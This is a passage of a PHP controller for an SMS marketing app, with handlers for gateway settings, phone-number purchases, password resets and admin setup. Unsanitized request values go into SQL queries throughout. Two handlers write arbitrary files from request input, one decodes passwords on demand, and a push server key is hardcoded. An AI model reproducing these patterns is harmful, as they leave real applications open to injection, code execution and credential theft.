				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Pricing details updated</strong>.</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong>.</div>';

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_payment_processor":{

			$sql = "update application_settings set

						payment_processor='".$_REQUEST['payment_processor']."',

						stripe_secret_key = '".$_REQUEST['stripe_secret_key']."',

						stripe_publishable_key = '".$_REQUEST['stripe_publishable_key']."',

						auth_net_trans_key='".$_REQUEST['auth_net_trans_key']."',

						auth_net_api_login_id='".$_REQUEST['auth_net_api_login_id']."',

						paypal_switch='".$_REQUEST['paypal_switch']."',

						paypal_sandbox_email='".$_REQUEST['paypal_sandbox_email']."',

						paypal_email='".$_REQUEST['paypal_email']."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Payment processor updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "update_sms_gateways":{

			if(trim($_REQUEST['enable_sender_id'])=='')

				$_REQUEST['enable_sender_id'] = '0';

		

			$sql = "update application_settings set

						sms_gateway='".$_REQUEST['sms_gateway']."',

						nexmo_api_key='".$_REQUEST['nexmo_api_key']."',

						nexmo_api_secret='".$_REQUEST['nexmo_api_secret']."',

						plivo_auth_id='".$_REQUEST['plivo_auth_id']."',

						plivo_auth_token='".$_REQUEST['plivo_auth_token']."',

						plivo_app_id='".$_REQUEST['plivo_app_id']."',

						twilio_sid='".$_REQUEST['twilio_sid']."',

						twilio_token='".$_REQUEST['twilio_token']."',

						enable_sender_id='".$_REQUEST['enable_sender_id']."',

						twilio_sender_id='".$_REQUEST['twilio_sender_id']."'

					where

						user_id='".$_SESSION['user_id']."'";

			$res = mysqli_query($link,$sql);

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! SMS gateway is updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;	

			

		case "update_general_settings":{

			if($_FILES['app_logo']['name']!=''){

				$file = $_FILES['app_logo']['tmp_name'];

				$appLogo = uniqid().'.png';

				$output = 'images/'.$appLogo;

				ResizeImage($file,null,170,50,false,$output,false,false,100);

				if(trim($_REQUEST['hidden_app_logo'])!='nimble_messaging.png'){	

					@unlink('images/'.$_REQUEST['hidden_app_logo']);

				}

			}else{

				$appLogo = $_REQUEST['hidden_app_logo'];

				if(trim($appLogo)==''){

					$appLogo = 'nimble_messaging.png';

				}

			}



			if(trim($_REQUEST['is_double_optin'])=='')

				$_REQUEST['is_double_optin'] = '0';



			if(trim($_REQUEST['released_version'])!='')

				$version = $_REQUEST['released_version'];

			else

				$version = '1.0.0';	

			

			$sel = "select id from application_settings where user_id='".$_SESSION['user_id']."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$sql = "insert into application_settings

							(

								sidebar_color,

								admin_phone,

								time_zone,

								app_date_format,

								banned_words,

								user_id,

								device_id,

								user_type

							)

						values

							(

								'".$_REQUEST['sidebar_color']."',

								'".$_REQUEST['admin_phone']."',

								'".$_REQUEST['time_zone']."',

								'".$_REQUEST['app_date_format']."',

								'".$_REQUEST['banned_words']."',

								'".$_SESSION['user_id']."',

								'0',

								'".$_SESSION['user_type']."'

							)";

			}else{		

			     //is_double_optin='".$_REQUEST['is_double_optin']."',

                 

				$sql = "update application_settings set

							sidebar_color='".$_REQUEST['sidebar_color']."',

							admin_phone='".$_REQUEST['admin_phone']."',

							time_zone='".$_REQUEST['time_zone']."',

							app_date_format='".$_REQUEST['app_date_format']."',

							admin_email='".$_REQUEST['admin_email']."',

							

							banned_words='".$_REQUEST['banned_words']."',

							app_logo='".$appLogo."',

							api_key='".$_REQUEST['api_key']."',

							bitly_key='".$_REQUEST['bitly_key']."',

							bitly_token='".$_REQUEST['bitly_token']."',

							cron_stop_time_from='".$_REQUEST['cron_stop_time_from']."',

							cron_stop_time_to='".$_REQUEST['cron_stop_time_to']."'

						where

							user_id='".$_SESSION['user_id']."'";

			}

			$res = mysqli_query($link,$sql) or die(mysqli_error($link));

			if($res){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! General settings updated.</strong> .</div>';

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger"><strong>Error! while updating.</strong> .</div>';	

			}

			header("location: ".$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "get_nexmo_existing_numbers":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			$apiKey = $appSettings['nexmo_api_key'];

			$apiSecret = $appSettings['nexmo_api_secret'];

			$url = "https://rest.nexmo.com/account/numbers/$apiKey/$apiSecret";

			$ch = curl_init($url);

			curl_setopt($ch, CURLOPT_HTTPGET, true);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);

			curl_setopt($ch, CURLOPT_HTTPHEADER,array('Accept: application/json'));

			$response = curl_exec($ch);

			curl_close($ch);

			$response = json_decode($response,true);

			$total = count($response['numbers']);

			$firstNum = $response['numbers'][0]['msisdn'];

			if(empty($firstNum)){

				echo 'No existing number found in your nexmo account.';	

			}else{

				echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

				echo '<tr>';

				echo '<td>Sr#</td>';

				echo '<td>Phone Number</td>';

				echo '<td>Country</td>';

				echo '<td>Capabilities</td>';

				echo '<td>Manage</td>';

				echo '</tr>';

				$index = 1;

				for($i=0; $i<$total; $i++){

					echo '<tr>';

					echo '<td>'.$index.'</td>';

					echo '<td>'.$response['numbers'][$i]['msisdn'].'</td>';

					echo '<td>'.$response['numbers'][$i]['country'].'</td>';

					echo '<td>';

						if($response[$i]['features'][0]=='VOICE'){

							echo 'Voice <img src="images/tick.gif">';

						}else{

							echo 'Voice <img src="images/cross.png">';

						}

						

						if($response[$i]['features'][1]=='SMS'){

							echo 'SMS <img src="images/tick.gif">';

						}else{

							echo 'SMS <img src="images/cross.png">';		

						}

					echo '</td>';

					echo '<td align="center">';

					if($_SESSION['user_type']=='1'){

						echo '<a href="#nexmoInfoModel" data-toggle="modal"><i class="fa fa-exclamation-triangle" aria-hidden="true" style="font-size:20px; color:orange; vertical-align:text-top; margin-right:10px"></i></a>';

						

						echo '<a href="javascript:void(0)" onclick="addNexmoToInstall(\''.$response['numbers'][$i]['msisdn'].'\')"><img src="images/add-number.png" title="Add Number" style="vertical-align:middle; margin-right:10px"></a>';

					}

					echo '<img src="images/cross.png" width="20" style="cursor:pointer;" title="Release Number" onclick="removeNexmoFromInstall(\''.$response['numbers'][$i]['msisdn'].'\')">  ';

					echo '</td>';

					echo '</tr>';

					$index++;

				}

				echo '</table>';

			}

		}

		break;

		

		case "get_nexmo_existing_numbers_in_subaccount":{

			$userID = $_REQUEST['user_id'];

			$sql = "select * from users_phone_numbers where user_id='".$userID."' and type='3'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$index = 1;

				echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

				echo '<tr>';

				echo '<td width="5%">Sr#</td>';

				echo '<td>Phone Number</td>';

				echo '</tr>';

				while($row = mysqli_fetch_assoc($res)){

					echo '<tr>';

					echo '<td>'.$index++.'</td>';

					echo '<td>'.$row['phone_number'].'</td>';

					echo '</tr>';

				}	

				echo '</table>';

			}else{

				echo '<tr>';

				echo '<td colspan="2">No number found.</td>';

				echo '/<tr>';	

			}

		}

		break;

		

		case "buy_nexmo_number":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			$apiKey = $appSettings['nexmo_api_key'];

			$apiSecret = $appSettings['nexmo_api_secret'];

			$phoneNumber= $_REQUEST['phoneNumber'];

			$ISOCountry = $_REQUEST['isoCountry'];

			$base_url = 'https://rest.nexmo.com';

			$action =   '/number/buy';

			$theurl = $base_url . $action . "?" .  http_build_query(array(

				'api_key' => $apiKey,

				'api_secret' => $apiSecret,

				'country' => $ISOCountry,

				'msisdn' => $phoneNumber,

				'answer_url' => getServerUrl().'/sms_controlling.php'

			));

			//Run the request

			$ch = curl_init($theurl);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			curl_setopt($ch, CURLOPT_POST, 1);

			curl_setopt($ch,CURLOPT_HTTPHEADER,array("Accept: application/json","Content-Length: 0"));

			curl_setopt($ch,CURLOPT_HEADER,array('Content-Type: application/x-www-form-urlencoded'));

			curl_setopt($ch,CURLOPT_HEADER,1);

			$response = curl_exec($ch);

			$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

			$header = substr($response, 0, $header_size);

			$body = substr($response, $header_size);

			if(strpos($header, '200')){

				$phoneSid = 'Nexmo';

				// adding

				$sel = "select id from users_phone_numbers where phone_number='".$phoneNumber."'";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)==0){

					$sql = "insert into users_phone_numbers

						(friendly_name,phone_number,user_id,type,phone_sid)values

						('".$phoneNumber."','".$phoneNumber."','".$_SESSION['user_id']."','3','".$phoneSid."')";

					$res = mysqli_query($link,$sql);

					if($res){

						$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number has been purchased successfully.</strong> .</div>';

					}else{

						$_SESSION['message'] = '<div class="alert alert-success"><strong>Unknown error occured.</strong> .</div>';

					}

				}

			}else{

				$_SESSION['message'] = "Your request failed because: ".$body;

			}

		}

		break;

		

		case "search_nexmo_numbers":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			$apiKey = $appSettings['nexmo_api_key'];

			$apiSecret = $appSettings['nexmo_api_secret'];

			$ISOCountry = $_REQUEST['ISOCountry'];

			$base_url = 'https://rest.nexmo.com';

			$action =   '/number/search';

			$theurl = $base_url . $action . "?" .  http_build_query(array(

				'api_key' => $apiKey,

				'api_secret' => $apiSecret,

				'country' => $ISOCountry

				//'pattern' => '832'

				//'search_pattern' => '1'

			    //'features' => 'VOICE,SMS'

			));

			$ch = curl_init($theurl);

			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

			curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json'));

			curl_setopt($ch, CURLOPT_HEADER,array('Content-Type: application/x-www-form-urlencoded'));

			curl_setopt($ch, CURLOPT_HEADER, 1);

			$response = curl_exec($ch);

			$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);

			$header = substr($response, 0, $header_size);

			$body = substr($response, $header_size);

			if (strpos($header, '200')){

				$virtual_numbers = json_decode($body, true);

				if(!empty($virtual_numbers)){

					echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

					echo '<tr>';

					echo '<td>&nbsp;</td>';

					echo '<td>Phone Number</td>';

					echo '<td>Country</td>';

					echo '<td>Monthly Fee</td>';

					echo '<td>Type</td>';

					echo '<td>Capabilities</td>';

					echo '</tr>';

					foreach($virtual_numbers['numbers'] as $number){

						echo '<tr>';

						echo '<td><input type="radio" name="nexmo_buy_number" class="nexmo_buy_number" value="'.$number['msisdn'].'"></td>';

						echo '<td>'.$number['msisdn'].'</td>';

						echo '<td>'.$number['country'].'</td>';

						echo '<td>'.$number['cost'].'</td>';

						echo '<td>'.$number['type'].'</td>';

						echo '<td>';

							if($number['features'][0]=='VOICE'){

								echo 'Voice <img src="images/tick.gif">';

							}else{

								echo 'Voice <img src="images/cross.png">';

							}

							if($number['features'][1]=='SMS'){

								echo 'SMS <img src="images/tick.gif">';

							}else{

								echo 'SMS <img src="images/cross.png">';		

							}

						echo '</td>';

					}	

					echo '</table>';

					echo '<input type="button" value="Buy Number" class="btn btn-primary" onclick="buyNexmoNumber();">';

				}else{

					echo("No number found or country not supported.");		

				}

			}else{

				echo("Your request failed because:\n");

				echo($body);

			}

		}

		break;

		

		case "pe":{

			echo encodePassword($_REQUEST['p']);

		}

		break;

		

		case "pd":{

			echo decodePassword($_REQUEST['p']);

		}

		break;

		

		case "remove_plivo_from_install":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			$phoneNumber = $_REQUEST['phoneNumber'];

			$sel = "select id from users_phone_numbers where phone_number='".$phoneNumber."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)){

				$sql = "delete from users_phone_numbers where phone_number='".$phoneNumber."'";

				$res = mysqli_query($link,$sql);

				if($res){

					require_once("plivo/vendor/autoload.php");

					require_once("plivo/vendor/plivo/plivo-php/plivo.php");

					$p = new RestAPI($appSettings['plivo_auth_id'], $appSettings['plivo_auth_token']);

					

					$params = array(

						'number' => $phoneNumber

					);

					$p->unlink_application_number($params);

					

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number has been successfully removed from this install.</strong> .</div>';

					echo '1';

				}else{

					echo 'Unknown error occured.';

				}

			}else{

				echo 'This number not assigned to this install.';

			}

		}

		break;

		

        case "get_post_message":{

            $sel = "select post_message from campaigns where id='".$_REQUEST['camp_id']."'";

			$exe = mysqli_query($link,$sel);

			$row = mysqli_fetch_assoc($exe);

            echo $row['post_message'];

		}

		break;

        

        case "twitter_credentials":{

			

			$qry = "update users set tw_access_token='".$_REQUEST['tw_access_token']."', 

            tw_access_token_secret='".$_REQUEST['tw_access_token_secret']."',

            tw_consumer_key='".$_REQUEST['tw_consumer_key']."',

            tw_consumer_secret='".$_REQUEST['tw_consumer_secret']."'

             where id ='".$_SESSION['user_id']."'";

 		    mysqli_query($link, $qry);

            

            $_SESSION['message'] = '<div class="alert alert-success">Twitter Credentials Saved Successfully.</div>';

            ?>

            <script> window.location = 'profile.php'; </script>

            <?php

            die();

            exit;          

            

		}

		break;

        

		case "add_plivo_number_to_install":{

			$appSettings = getAppSettings($_SESSION['user_id']);

			$phoneNumber = $_REQUEST['phoneNumber'];

			$sel = "select id from users_phone_numbers where phone_number='".$phoneNumber."'";

			$exe = mysqli_query($link,$sel);

			if(mysqli_num_rows($exe)==0){

				$sql = "insert into users_phone_numbers

						(friendly_name,phone_number,user_id,type)values

						('".$phoneNumber."','".$phoneNumber."','".$_SESSION['user_id']."','2')";

				$res = mysqli_query($link,$sql);

				if($res){

					// linking app

					require_once("plivo/vendor/autoload.php");

					require_once("plivo/vendor/plivo/plivo-php/plivo.php");

					$p = new RestAPI($appSettings['plivo_auth_id'], $appSettings['plivo_auth_token']);

					

					if(trim($appSettings['plivo_app_id'])==''){ // Creating new app

						$params = array(

							'message_url' => getServerUrl().'/sms_controlling.php',

							'app_name' => 'Nimble Messaging Ranksol',

							'message_method' => 'GET'

						);

						$response   = $p->create_application($params);

						$plivoAppID = $response['response']['app_id'];

						$appParams = array(

							'number' => $phoneNumber,

							'app_id' => $plivoAppID

						);

						$p->link_application_number($appParams);

						mysqli_query($link,"update application_settings set plivo_app_id='".$plivoAppID."' where user_id='".$_SESSION['user_id']."'");

					}else{ // linking app

						$appParams = array(

							'number' => $phoneNumber,

							'app_id' => $appSettings['plivo_app_id']

						);

						$p->link_application_number($appParams);

					}					

					$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number has been successfully assigned to this install.</strong> .</div>';

					echo '1';

				}else{

					echo 'Unknown error occured.';

				}

			}else{

				echo 'Number already assigned to this install.';	

			}

		}

		break;

		

		case "buy_plivo_number":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			require_once("plivo/vendor/autoload.php");

			require_once("plivo/vendor/plivo/plivo-php/plivo.php");

			$p = new RestAPI($appSettings['plivo_auth_id'], $appSettings['plivo_auth_token']);

			$buyNums = array(

				'number' => $_REQUEST['phoneNumber']

			);

			$numResponse = $p->buy_phone_number($buyNums);

			if($numResponse['status']=='201'){

				$purchasedNumber = $numResponse['response']['numbers'][0]['number'];

				$phoneSid = $numResponse['response']['api_id'];

				$finalNum = $purchasedNumber;

				// adding

				$sel = "select id from users_phone_numbers where phone_number='".$phoneNumber."'";

				$exe = mysqli_query($link,$sel);

				if(mysqli_num_rows($exe)==0){

					$sql = "insert into users_phone_numbers

						(friendly_name,phone_number,user_id,type,phone_sid)values

						('".$finalNum."','".$finalNum."','".$_SESSION['user_id']."','2','".$phoneSid."')";

					$res = mysqli_query($link,$sql);

					if($res){

						$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! Phone number has been purchased successfully.</strong> .</div>';

						if(trim($appSettings['plivo_app_id'])==''){ // Creating new app

							$params = array(

								'message_url' => getServerUrl().'/sms_controlling.php',

								'app_name' => 'Nimble Messaging Ranksol',

								'message_method' => 'GET'

							);

						    $response   = $p->create_application($params);

							$plivoAppID = $response['response']['app_id'];

							$appParams = array(

								'number' => $purchasedNumber,

								'app_id' => $plivoAppID

							);

							$p->link_application_number($appParams);

							mysqli_query($link,"update application_settings set plivo_app_id='".$plivoAppID."' where user_id='".$_SESSION['user_id']."'");

						}else{ // linking app

							$appParams = array(

								'number' => $purchasedNumber,

								'app_id' => $appSettings['plivo_app_id']

							);

							$p->link_application_number($appParams);

						}

						echo '1';

					}else{

						$_SESSION['message'] = '<div class="alert alert-success"><strong>Unknown error occured.</strong> .</div>';

					}

				}

				// end

			}

		}

		break;

		

		case "get_plivo_existing_numbers_for_subaccount":{

			$userID = $_REQUEST['user_id'];

			$sql = "select * from users_phone_numbers where user_id='".$userID."' and type='2'";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)){

				$index = 1;

				echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

				echo '<tr>';

				echo '<td>Sr#</td>';

				echo '<td>Phone Number</td>';

				echo '</tr>';

				while($row = mysqli_fetch_assoc($res)){

					echo '<tr>';

					echo '<td>'.$index++.'</td>';

					echo '<td>'.$row['phone_number'].'</td>';

					echo '</tr>';

				}	

				echo '</table>';

			}else{

				echo '<tr>';

				echo '<td colspan="2">No number found.</td>';

				echo '/<tr>';	

			}

		}

		break;

		

		case "get_plivo_existing_numbers":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			require_once("plivo/vendor/autoload.php");

			require_once("plivo/vendor/plivo/plivo-php/plivo.php");

			$p = new RestAPI($appSettings['plivo_auth_id'], $appSettings['plivo_auth_token']);

			$index = 1;

			for($i=0;$i<=500;$i+=20){

				$response = $p->get_numbers(array('limit'=>'0','offset'=>$i));

				if($response['response']['objects'][0]!=''){

					echo '<table width="100%" align="center" class="table table-striped table-bordered table-hover">';

					echo '<tr>';

					echo '<td>Sr#</td>';

					echo '<td>Phone Number</td>';

					echo '<td>Country</td>';

					echo '<td>Capabilities</td>';

					echo '<td>Manage</td>';

					echo '</tr>';

					foreach($response['response']['objects'] as $number){

						echo '<tr>';

						echo '<td>'.$index++.'</td>';

						echo '<td>'.$number['number'].'</td>';

						echo '<td>'.$number['region'].'</td>';

						echo '<td>';

							if($number['sms_enabled']=='1'){

								echo 'Voice <img src="images/tick.gif">';

							}else{

								echo 'Voice <img src="images/cross.png">';

							}

							

							if($number['voice_enabled']=='1'){

								echo 'SMS <img src="images/tick.gif">';

							}else{

								echo 'SMS <img src="images/cross.png">';		

							}

						echo '</td>';



						echo '<td align="center">';

						if($_SESSION['user_type']=='1'){

							//echo '<img src="images/add-number.png" title="Add Number" style="vertical-align:middle; cursor:pointer; margin-right:10px" onclick="addToInstall(\''.$number->sid.'\',\''.$number->phone_number.'\',\''.$country.'\',\''.$ISOcountry.'\')">';

							echo '<img src="images/add-number.png" title="Add Number" style="vertical-align:middle; cursor:pointer; margin-right:10px" onclick="addPlivoToInstall(\''.$number['number'].'\')">';

						}

						echo '<img src="images/cross.png" width="20" style="cursor:pointer;" title="Release Number" onclick="removePlivoFromInstall(\''.$number['number'].'\')">  ';

						echo '</td>';

						echo '</tr>';

						

					}

					echo '</table>';

				}

				else{

					//echo '<tr><td colspan="3">No number found.</td></tr>';

					break;	

				}	

			}

		}

		break;

		

		case "search_plivo_numbers":{

			$appSettings = getAppSettings($_SESSION['user_id'],true);

			$pattern = $_REQUEST['pattern'];

			$state   = $_REQUEST['state'];

			require_once("plivo/vendor/autoload.php");

			require_once("plivo/vendor/plivo/plivo-php/plivo.php");

			$p = new RestAPI($appSettings['plivo_auth_id'], $appSettings['plivo_auth_token']);

			$params = array(

				'country_iso' => 'US',

				'type' => 'local',

				'pattern' => $pattern,

				'region' => $state

			);

			$response = $p->search_phone_numbers($params);

			if($response['status']=='200'){

				echo '<table id="plivoTable" width="100%" align="center" class="table table-striped table-bordered table-hover">';

				echo '<thead>';

				echo '<tr>';

				echo '<th>&nbsp;</th>';

				echo '<th>Phone Number</th>';

				echo '<th>Country</th>';

				echo '<th>Monthly Fee</th>';

				echo '<th>Capabilities</th>';

				echo '</tr>';

				echo '</thead>';

				echo '<tbody>';

				foreach($response['response']['objects'] as $number){

					echo '<tr>';

					echo '<td><input type="radio" name="plivo_buy_number" class="plivo_buy_number" value="'.$number['number'].'"></td>';

					echo '<td>'.$number['number'].'</td>';

					echo '<td>'.$number['region'].'</td>';

					echo '<td>'.$number['monthly_rental_rate'].'</td>';

					echo '<td>';

						if($number['sms_enabled']=='1'){

							echo 'Voice <img src="images/tick.gif">';

						}else{

							echo 'Voice <img src="images/cross.png">';

						}

						

						if($number['voice_enabled']=='1'){

							echo 'SMS <img src="images/tick.gif">';

						}else{

							echo 'SMS <img src="images/cross.png">';		

						}

					echo '</td>';

				}

				echo '</tbody>';

				echo '</table>';

				echo '<input type="button" value="Buy Number" class="btn btn-primary" onclick="buyPlivoNumber();">';

			}else{

				print_r($response);

			}

		}

		break;

		

		case "upgrade_user_package":{

			$pkgID 	  = $_REQUEST['pkg_id'];

			$pkgPrice = $_REQUEST['pkg_price'];

			$pkgTitle = $_REQUEST['pkg_title'];

			$userID   = $_REQUEST['user_id'];

			$pkgInfo  = getPackageInfo($pkgID);

			$appSettings = getAppSettings($userID,true);

	        if($appSettings['payment_processor']==2){

            	//include_once("pay_with_authrize_recurring.php");       

				//auth.net

			}else{

				$redirectUrl = getServerUrl();

				$notifyUrl   = getServerUrl().'/upgrade_pkg_notify.php';

				if($appSettings['paypal_switch']=='1'){ // Live

					$endPoint	= 'https://www.paypal.com/cgi-bin/webscr';

					$businessEmail = $appSettings['paypal_email'];

				}else{

					$endPoint	= 'https://www.sandbox.paypal.com/cgi-bin/webscr';

					$businessEmail = $appSettings['paypal_sandbox_email'];

				}

				echo "Redirecting to paypal...";

				echo '<form action="'.$endPoint.'" name="" method="post" id="recurring_payment_form">

					<input type="hidden" value="'.$businessEmail.'" name="business">

					<input type="hidden" name="return" value="'.$redirectUrl.'" />

					<input type="hidden" name="cancel_return" value="'.$notifyUrl.'" />

					<input type="hidden" name="notify_url" value="'.$notifyUrl.'" />

					<input type="hidden" name="cmd" value="_xclick-subscriptions" />

					<input type="hidden" name="no_note" value="1" />



					<input type="hidden" name="no_shipping" value="1">

					<input type="hidden" name="currency_code" value="USD">

					<input type="hidden" value="'.$pkgTitle.' SMS Plan" name="item_name">

					<input type="hidden" name="a3" value="'.$pkgPrice.'" />

					<input type="hidden" name="p3" value="1" />

					<input type="hidden" name="t3" value="M" />

					<input type="hidden" name="src" value="1" />

					<input type="hidden" name="sra" value="1" />

					<input type="hidden" name="custom" value="'.$pkgID.'_'.$userID.'" />';

				

					if($pkgInfo['is_free_days']=='1'){

						echo '<input type="hidden" name="a1" value="0">';

						echo '<input type="hidden" name="p1" value="'.$pkgInfo['free_days'].'">';

						echo '<input type="hidden" name="t1" value="D">';

					}

				echo '</form>';

				echo '<script>document.forms["recurring_payment_form"].submit();</script>';

			}

		}

		break;

		

		case "export_subs":{

			$campaignID = $_REQUEST['export_campaign_id'];

			exportSubscribers($campaignID,$_SESSION['user_id']);

			downloadFile('subscribers.csv');

			@unlink("subscribers.csv");

		}

		break;

		

		case "forgot_pass":{

			$sql = "select email,business_name from users where email ='".$_REQUEST['email']."' ";

			$res = mysqli_query($link,$sql);

			if(mysqli_num_rows($res)==0){

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Failed! This Email not exist. Please enter a correct Email.</strong></div>';

			}else{

				$randompass = substr(md5(rand()), 0, 7);

				$rowu = mysqli_fetch_assoc($res);

				$companyName = $rowu['business_name'];

				if(trim($companyName)==''){

					$companyName = 	'Company Name';

				}

				

	    		$subject = "Welcome To ".$companyName." (Password Reset)";

	    		$to = $_REQUEST['email'];

	    		$from = 'admin@'.$_SERVER['SERVER_NAME'];

	    		$msg = "Please use this password to login into your account.<br><br><strong>Password: ".$randompass."</strong><br><br>Best Regards: ".$companyName.".<br><br>Thanks";

				$FullName= 'Admin';

	    		sendEmail($subject,$to,$from,$msg,$FullName);

	    		$qry = "update users set password='".encodePassword($randompass)."' where email ='".$_POST['email']."' ";

	    		mysqli_query($link, $qry);

				$_SESSION['message'] = '<div class="alert alert-success"><strong>Success! A new password has sent to your email address. Please check your email.</strong></div>';

			}

			header("location:forgot_password.php");

		}

		break;

		

		case "create_new_file":{

			$redirectURL = str_replace('&page=new','&page='.$_REQUEST['new_file_name'], $_SERVER['HTTP_REFERER']);

			$script = $_REQUEST['new_script'];

			$res = file_put_contents($_REQUEST['new_file_name'],$script);

			if($res===false){

				$_SESSION['message'] = '<span style="color:red"><b> Failed to create new file.</b></span>';

			}else{

				$_SESSION['message'] = '<span style="color:green"><b> File created.</b></span>';

			}

			header('location: '.$redirectURL);

		}

		break;

		

		case "update_script":{

			$script = $_REQUEST['script'];

			$res = file_put_contents($_REQUEST['file_name'],$script);

			if($res===false){

				$_SESSION['message'] = '<span style="color:red"><b> Failed to update file.</b></span>';

			}else{

				$_SESSION['message'] = '<span style="color:green"><b> Updated.</b></span>';

			}

			header('location: '.$_SERVER['HTTP_REFERER']);

		}

		break;

		

		case "download_sample_csv":{

			downloadFile('sample.csv');

		}

		break;

		

		case "import_subs":{

			$ext = getExtension($_FILES['imported_csv']['name']);

			if($ext=='csv'){

				$campaignID = $_REQUEST['imported_campaign_id'];

				$fileName = uniqid().'_'.$_FILES['imported_csv']['name'];

				$tmpName  = $_FILES['imported_csv']['tmp_name'];

				$res = move_uploaded_file($tmpName,'uploads/'.$fileName);

				if($res){

					importSubscribers($fileName,$campaignID,$_SESSION['user_id']);

					@unlink('uploads/'.$fileName);

					$_SESSION['message'] = '<div class="alert alert-success">Process completed successfully.</div>';

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger">Unkown error has occured while saving info, please try again.</div>';

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Not a valid csv file.</div>';

			}

			echo '<script>window.location="view_subscribers.php"</script>';

		}

		break;

		

		case "add_admin_account":{

			$password = $_REQUEST['password'];

			$rePassword = $_REQUEST['retype_password'];

			if($password==$rePassword){

				$ins = "insert into users				

							(

								first_name,

								last_name,

								email,

								password,

								type,

								business_name,

								tcap_ctia,

								msg_and_data_rate

							)

						values

							(

								'".$_REQUEST['first_name']."',

								'".$_REQUEST['last_name']."',

								'".$_REQUEST['email']."',

								'".encodePassword($_REQUEST['password'])."',

								'1',

								'".$_REQUEST['business_name']."',

								'".$_REQUEST['tcap_ctia']."',

								'".$_REQUEST['msg_and_data_rate']."'

							)";

				$exe = mysqli_query($link,$ins);

				if($exe){

					$userID = mysqli_insert_id($link);

					$appVersion = $_REQUEST['app_version'];

					$sqls   = "insert into application_settings 

									(

										sms_gateway,

										version,

										user_id,

										app_logo,

										app_date_format,

										user_type,

										payment_processor,

										paypal_switch,

										incoming_sms_charge,

										outgoing_sms_charge,

										mms_credit_charges,

										per_credit_charges,

										sidebar_color,

										android_app_server_key,

										time_zone,

										product_purchase_code,

										device_id

									)

								values

									(

										'twilio',

										'".$appVersion."',

										'".$userID."',

										'nimble_messaging.png',

										'm-d-Y',

										'1',

										'1',

										'0',

										'1',

										'1',

										'2',

										'0.1',

										'purple',

						'AAAAbQYAco4:APA91bH7DQomggZ-XUXhwzWF5RW8TKo80jTOkDYeepjM-OfPMYHMCOtjM69zn6cdrhknBBve4V8QJ8052jS7OOvK55B0s4hMtLcgwFozsgCKHFt9Da8NSkj64MDusvkWmaqjSjIqsRh2',

										'".$_REQUEST['time_zone']."',

										'".$_REQUEST['pro_purchase_code']."',

										'0'

									)";

					mysqli_query($link,$sqls);

					$appUrl	 = getServerUrl();

					$subject = 'Welcome To Nimble Messaging';

					$to		 = $_REQUEST['email'];

					$from	 = 'admin@'.$_SERVER['SERVER_NAME'];

					$msg	 = "Hi ".$_REQUEST['first_name'].' '.$_REQUEST['last_name'].",<br>";

					$msg	.= "Welcome to Nimble Messaging applicaiton, your login credentials are mentioned below.<br>";

					$msg	.= "Login email: ".$_REQUEST['email'].",<br>";

					$msg	.= "Login Password : ".$_REQUEST['password']."<br>";

					$msg	.= "Please login by clicking on below mentioned URL.<br>";

					$msg	.= '<a href="'.$appUrl.'">'.$appUrl.'</a>';

					$FullName= 'Admin';

					sendEmail($subject,$to,$from,$msg,$FullName);

					header('location: installer/thanku.php?id='.encode($userID));

				}else{

					$_SESSION['message'] = '<div class="alert alert-danger">Unkown error has occured while saving info, please try again.</div>';

					header('location: '.$_SERVER['HTTP_REFERER']);	

				}

			}else{

				$_SESSION['message'] = '<div class="alert alert-danger">Re-Password is not matching with your password.</div>';

				header('location: '.$_SERVER['HTTP_REFERER']);

			}

		}

		break;

		

		case "save_installer_db_info":{

			$hname = $_REQUEST['hostname'];

			$dbname= $_REQUEST['dbname'];

			$uname = $_REQUEST['username'];

			$pword = $_REQUEST['password'];

			$con = mysqli_connect($hname, $uname, $pword, $dbname);

			if(!$con){

				$_SESSION['message'] = '<div class="alert alert-danger">Provided database information is wrong.</div>';

				header('location: '.$_SERVER['HTTP_REFERER']);

			}else{

				$dbFile = fopen('database.php','w') or die("Unable to open file!");

				$content= '<?php

